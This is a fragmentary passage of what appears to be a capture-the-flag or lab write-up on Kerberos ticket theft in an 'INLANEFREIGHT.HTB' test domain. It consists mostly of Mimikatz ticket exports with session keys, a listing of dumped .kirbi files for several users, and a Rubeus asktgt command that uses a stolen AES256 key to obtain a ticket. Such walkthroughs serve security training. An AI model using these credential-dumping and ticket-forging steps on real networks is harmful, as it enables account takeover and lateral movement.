...
As a result of the previous command we can find the john's ticket (`[0;5e684]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi`):
```c
 * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ...
        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 10/18/2024 5:02:14 AM ; 10/18/2024 3:02:14 PM ; 10/25/2024 5:02:14 AM
           Service Name (02) : cifs ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (02) : cifs ; DC01.inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b85afd05824003e0bdf8fb978a58f55dd19779cd45e75b56ef72c22c889e65dd
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 7        [...]
           * Saved to file [0;ac9e7]-0-0-40a50000-john@cifs-DC01.inlanefreight.htb.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 10/18/2024 5:12:50 AM ; 10/18/2024 3:12:50 PM ; 10/25/2024 5:12:50 AM
           Service Name (02) : krbtgt ; inlanefreight.htb ; @ INLANEFREIGHT.HTB
           Target Name  (--) : @ inlanefreight.htb
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000017 - rc4_hmac_nt
             fa4569f35815c3b1d7597201f0de17d9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;ac9e7]-2-0-40e10000-john@krbtgt-inlanefreight.htb.kirbi !
         [00000001]
           Start/End/MaxRenew: 10/18/2024 5:02:14 AM ; 10/18/2024 3:02:14 PM ; 10/25/2024 5:02:14 AM
           Service Name (02) : krbtgt ; INLANEFREIGHT.HTB ; @ INLANEFREIGHT.HTB
           Target Name  (--) : @ INLANEFREIGHT.HTB
           Client Name  (01) : john ; @ INLANEFREIGHT.HTB ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0eefb72d823a2fed3b725e55ac182ca8d38b8e03a9049c116ece5dd7ce65d63
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;ac9e7]-2-1-60a10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi !
```
...
10/18/2024  06:49 AM                 0 Rubeus.exe
10/18/2024  07:04 AM             1,703 [0;3e4]-0-0-40a50000-MS01$@DNS-dc01.inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,705 [0;3e4]-0-1-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,743 [0;3e4]-0-2-40a50000-MS01$@ldap-dc01.inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,739 [0;3e4]-0-3-40a50000-MS01$@GC-DC01.inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,633 [0;3e4]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:04 AM             1,633 [0;3e4]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:05 AM             1,743 [0;3e7]-0-0-40a50000-MS01$@cifs-DC01.inlanefreight.htb.kirbi
10/18/2024  07:05 AM             1,659 [0;3e7]-0-1-40a50000.kirbi
10/18/2024  07:05 AM             1,705 [0;3e7]-0-2-40a50000-MS01$@LDAP-DC01.inlanefreight.htb.kirbi
10/18/2024  07:05 AM             1,743 [0;3e7]-0-3-40a50000-MS01$@ldap-DC01.inlanefreight.htb.kirbi
10/18/2024  07:05 AM             1,633 [0;3e7]-2-0-60a10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:05 AM             1,633 [0;3e7]-2-1-40e10000-MS01$@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:04 AM             1,641 [0;4d371]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:04 AM             1,623 [0;4dd62]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:04 AM             1,633 [0;4e6a2]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
10/18/2024  07:04 AM             1,695 [0;ac9e7]-0-0-40a50000-john@cifs-DC01.inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,591 [0;ac9e7]-2-0-40e10000-john@krbtgt-inlanefreight.htb.kirbi
10/18/2024  07:04 AM             1,623 [0;ac9e7]-2-1-60a10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
              22 File(s)      9,661,526 bytes
               3 Dir(s)  18,066,776,064 bytes free
```

```c
Authentication Id : 0 ; 318818 (00000000:0004dd62)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 10/18/2024 4:56:52 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108
...
```c
C:\tools>Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /nowrap
...
[*] base64(ticket.kirbi):
      ...
      

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  10/18/2024 5:06:36 AM
  EndTime                  :  10/18/2024 3:06:36 PM
  RenewTill                :  10/25/2024 5:06:36 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  yvsM79W08evdJPs9ji4XAvHXYx8UvAtig8eQHCNhMNQ=
